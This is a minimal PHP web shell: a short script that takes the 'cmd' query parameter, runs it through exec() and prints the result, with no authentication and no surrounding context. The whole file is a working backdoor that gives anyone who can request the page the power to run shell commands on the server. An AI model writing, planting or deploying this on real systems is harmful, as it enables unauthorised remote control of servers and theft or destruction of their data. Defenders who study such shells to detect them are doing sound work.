<?php

if (isset($_GET['cmd'])) {
echo '<pre>';
echo exec($_GET['cmd']);
echo '<pre>';
}

?>
